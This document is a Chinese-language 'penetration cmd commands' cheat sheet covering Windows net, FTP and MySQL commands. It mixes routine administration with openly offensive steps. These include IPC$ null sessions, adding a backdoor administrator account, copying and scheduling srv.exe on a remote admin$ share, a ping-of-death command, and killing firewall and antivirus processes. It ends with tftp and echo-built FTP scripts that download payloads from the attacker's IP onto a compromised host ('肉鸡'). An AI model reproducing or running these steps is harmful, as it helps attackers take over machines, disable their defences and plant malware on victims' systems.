渗透常用cmd命令
net use \\ip\ipc$ " " /user:" " 建立IPC空链接 
net use \\ip\ipc$ "密码" /user:"用户名" 建立IPC非空链接 
net use h: \\ip\c$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H: 
net use h: \\ip\c$ 登陆后映射对方C：到本地为H: 
net use \\ip\ipc$ /del 删除IPC链接 
net use h: /del 删除映射对方到本地的为H:的映射 
net user 用户名　密码　/add 建立用户 
net user guest /active:yes 激活guest用户 
net user 查看有哪些用户 
net user 帐户名 查看帐户的属性 
net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数 
net start 查看开启了哪些服务 
net start 服务名　 开启服务；(如:net start telnet， net start schedule) 
net stop 服务名 停止某服务 
net time \\目标ip 查看对方时间 
net time \\目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息 
net view 查看本地局域网内开启了哪些共享 
net view \\ip 查看对方局域网内开启了哪些共享 
net config 显示系统网络设置 
net logoff 断开连接的共享 
net pause 服务名 暂停某服务 
net ver 局域网内正在使用的网络连接类型和信息 
net share 查看本地开启的共享 
net share ipc$ 开启ipc$共享 
net share ipc$ /del 删除ipc$共享 
net share c$ /del 删除C：共享 
net user guest 12345 用guest用户登陆后用将密码改为12345 
net password 密码 更改系统登陆密码 
netstat -a 查看开启了哪些端口,常用netstat -an 
netstat -n 查看端口的网络连接情况，常用netstat -an 
netstat -v 查看正在进行的工作 
netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况） 
netstat -s 查看正在使用的所有协议使用情况 
nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写 
tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。 
ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。 
ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) 
ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息 
tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除
除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件
以外的所有文件
del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同） 
move 盘符\路径\要移动的文件名　存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 
fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令 
at id号 开启已注册的某个计划任务 
at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 
at id号 /delete 停止某个已注册的计划任务 
at 查看所有的计划任务 
at \\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 
finger username @host 查看最近有哪些用户登陆 
telnet ip 端口 远和登陆服务器,默认端口为23 
open ip 连接到IP（属telnet登陆后的命令） 
telnet 在本机上直接键入telnet 将进入本机的telnet 
copy 路径\文件名1　路径\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 
copy c:\srv.exe \\ip\admin$ 复制本地c:\srv.exe到对方的admin下 
cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件 
copy \\ip\admin$\svv.exe c:\ 或:copy\\ip\admin$\*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C： 
xcopy 要复制的文件或目录树　目标地址\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 
ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) 
route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface 
arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 
start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 
attrib 文件名(目录名) 查看某文件（目录）的属性 
attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性 
dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次环梦适奔洌?T:W上次被修改时间 
date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间 
set 指定环境变量名称=要指派给变量的字符 设置环境变量 
set 显示当前所有的环境变量 
set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 
pause 暂停批处理程序，并显示出：请按任意键继续....  
call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） 
echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 
echo 信息 在屏幕上显示出信息 
echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中 
findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello 
find 文件名 查找某文件 
title 标题名字 更改CMD窗口标题名字 
color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 
prompt 名称 更改cmd.exe的显示的命令提示符(把C:\、D:\统一改为：EntSky\ )
ver 在DOS窗口下显示版本信息 
winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） 
format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS 
md　目录名 创建目录 
replace 源文件　要替换文件的目录 替换文件 
ren 原文件名　新文件名 重命名文件名 
tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 
type 文件名 显示文本文件的内容 
more 文件名 逐屏显示输出文件 
doskey 要锁定的命令＝字符 
doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= 
taskmgr 调出任务管理器 
chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 
tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 
exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe 
path 路径\可执行文件的文件名 为可执行文件设置一个路径。 
regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； 
regedit /e 注册表文件名 导出注册表 
cacls 文件名　参数 显示或修改文件访问控制列表（ACL）――针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\test.txt /D pub 设定d:\test.txt拒绝pub用户访问。 
cacls 文件名 查看文件的访问用户权限列表 
REM 文本内容 在批处理文件中添加注解 
netsh 查看或更改本地网络配置情况 


IIS服务命令： 
iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） 
iisreset /start或stop 启动（停止）所有Internet服务 
iisreset /restart 停止然后重新启动所有Internet服务 
iisreset /status 显示所有Internet服务状态 
iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 
iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 
iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 
iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。 



FTP 命令：
ftp的命令行格式为: 
ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。 
－d 使用调试方式。 
－n 限制ftp的自动登录,即不使用.netrc文件。 
－g 取消全局文件名。 
help [命令] 或 ？[命令] 查看命令说明 
bye 或 quit 终止主机FTP进程,并退出FTP管理方式. 
pwd 列出当前远端主机目录 
put 或 send 本地文件名
get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中 
mget [remote-files] 从远端主机接收一批文件至本地主机 
mput local-files 将本地主机中一批文件传送至远端主机 
dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件 
ascii 设定以ASCII方式传送文件(缺省值) 
bin 或 image 设定以二进制方式传送文件 
bell 每完成一次文件传送,报警提示 
cdup 返回上一级目录 
close 中断与远程服务器的ftp会话(与open对应) 
open host[port] 建立指定ftp服务器连接,可指定连接端口 
delete 删除远端主机中的文件 
mdelete [remote-files] 删除一批文件 
mkdir directory-name 在远端主机中建立目录 
rename [from] [to] 改变远端主机中的文件名 
rmdir directory-name 删除远端主机中的目录 
status 显示当前FTP的状态 
system 显示远端主机系统类型 
user user-name [password] [account] 重新以别的用户名登录远端主机 
open host [port] 重新建立一个新的连接 
prompt 交互提示模式 
macdef 定义宏命令 
lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录 
chmod 改变远端主机的文件权限 
case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母 
cd remote－dir 进入远程主机目录 
cdup 进入远程主机目录的父目录 
! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip 

MYSQL命令： 
连接MYSQL ：
mysql -h主机地址 -u用户名 －p密码
（例：mysql -h110.110.110.110 -uroot -p123456 
注:u与root可以不用加空格） 
exit 退出MYSQL 
修改密码：
mysqladmin -u用户名 -p旧密码 password 新密码; 
增加新用户：
grant select on 数据库.* to 用户名@登录主机 identified by \"密码\";
show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。 
建库:
create database 库名;
进入mysql库：
use mysql;
显示库中的数据表:
show tables; 
显示数据表的结构 
desc 表名;  
建表：  
create table 表名 (字段设定列表)；
删库删表：  
drop database 库名; 
drop table 表名; 
将表中记录清空:
delete from 表名;  
查表中信息：
select * from 表名; 
备份数据库：（命令在DOS的\\mysql\\bin目录下执行）
注释:将数据库school备份到school.txt文件 
mysqldump --opt school>school.bbb 
关闭或重启本地或远程主机：
shutdown /参数 。 
参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。 
例：shutdown /r /t 0 立即重启本地主机（无延时） 
终止一个或多个任务和进程：
taskill /参数 进程名或进程的pid 
参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 
tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 
参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。 


用户操作 
net user 查看有哪些用户 
net user guest /active:yes 激活guest用户 
net user 用户名　密码　/add 建立用户 
net localgroup administrators 用户名 /add 把“用户”添加到管理员中 
使其具有管理员权限 


net start -----查看开启了哪些服务 
net start 服务名-----开启服务 
net stop 服务名------停止某服务 
netstat -an :查看端口的网络连接情况 
ipconfig :查看本地ip地址 

net stop sharedaccess ----关系统自带防火墙 
pskill.exe ravmon -----杀掉瑞星软件 
pskill.exe pfw ----关天网防火墙 
net stop "Symantec AntiVirus"----关于诺顿企业版 
net stop KAVStart------关闭金山杀毒 

向肉鸡上传文件命令: 
第一种方法:tftp 
命令格式:tftp -i 你的公网IP get xx.exe 
第二种方法:ftp 
命令格式: 
echo open xxx.xxx.xxx.xxx>c:\520hack.txt 
echo user>>c:\520hack.txt 
echo pass>>c:\520hack.txt 
echo get aoqi.rar>>c:\520hack.txt 
echo bye>>c:\520hack.txt 
ftp -s:c:\520hack.txt
第三种使用下载者 
